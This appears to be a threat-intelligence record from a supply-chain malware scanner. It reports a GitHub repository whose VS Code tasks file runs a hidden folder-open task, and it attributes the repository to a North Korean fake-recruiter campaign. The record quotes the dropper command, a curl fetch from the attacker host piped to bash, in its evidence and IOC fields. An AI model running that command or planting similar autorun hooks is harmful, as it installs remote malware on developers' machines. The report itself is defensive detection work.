@@ -1,0 +1,72 @@
+{
+  "finding": {
+    "key": "repository:nurfarazi/safemailer",
+    "kind": "repository",
+    "family": "",
+    "id": "nurfarazi/safemailer",
+    "url": "https://github.com/nurfarazi/SafeMailer",
+    "registry": "github",
+    "owner": "nurfarazi",
+    "status": "confirmed",
+    "confidence": "",
+    "score": 5,
+    "detection_method": "malicious_owner",
+    "attribution": "",
+    "campaign_id": "GW-C-498a0aeb",
+    "rules": "install_hook/vscode-autorun",
+    "evidence_locations": ".vscode/tasks.json:0; SafeMailer/.vscode/tasks.json:0",
+    "c2_hosts": "default-configuration-sandy.vercel.app",
+    "iocs": "default-configuration-sandy.vercel.app; https://default-configuration-sandy.vercel.app/settings/linux?flag=9-test; curl https://default-configuration-sandy.vercel.app/settings/linux?flag=9-test | bash; .vscode/tasks.json",
+    "matched_signatures": "",
+    "reasons": "repository under owner nurfarazi of a known-malicious repo | Tier-2 confirmed (bash score 5)",
+    "osm_status": "submitted",
+    "osm_threat_id": "84a8a4ae-8989-42b4-9c30-2a39bad3d829",
+    "first_seen": "hunt-20260702T050848Z",
+    "last_seen": "hunt-20260702T050848Z",
+    "evidence_file": "repositories/nurfarazi_safemailer.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration-sandy.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration-sandy.vercel.app/settings/linux?flag=9-test | sh curl https://default-configura"
+    },
+    {
+      "file": "SafeMailer/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration-sandy.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration-sandy.vercel.app/settings/linux?flag=9-test | sh curl https://default-configura"
+    }
+  ],
+  "commit_sha": null,
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/nurfarazi/safemailer",
+    "version_info": "all",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json, SafeMailer/.vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from default-configuration-sandy.vercel.app and executes it (.vscode/tasks.json, SafeMailer/.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nThe same dropper is planted in 2 directories.\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: default-configuration-sandy.vercel.app.\nCampaign GW-C-498a0aeb: one of 89 confirmed repos across 14 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 3 distinct hosts, including default-configuration-sandy.vercel.app, default-configuration.vercel.app, vscode-extension-260120.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: default-configuration-sandy.vercel.app.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: .vscode/tasks.json, SafeMailer/.vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from default-configuration-sandy.vercel.app and executes it (.vscode/tasks.json, SafeMailer/.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed (+1 more)\n- Attacker hosts: default-configuration-sandy.vercel.app",
+    "publisher": "nurfarazi",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "polinrider",
+      "contagious-interview",
+      "fake-recruiter",
+      "dprk",
+      "north-korea",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/nurfarazi/safemailer/blob/HEAD/.vscode/tasks.json\nhttps://github.com/nurfarazi/safemailer/blob/HEAD/SafeMailer/.vscode/tasks.json",
+    "verified_iocs": "default-configuration-sandy.vercel.app\nhttps://default-configuration-sandy.vercel.app/settings/linux?flag=9-test\ncurl https://default-configuration-sandy.vercel.app/settings/linux?flag=9-test | bash\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-07-02T05:08:48Z",
+    "last_seen": "2026-07-02T05:08:48Z"
+  }
+}
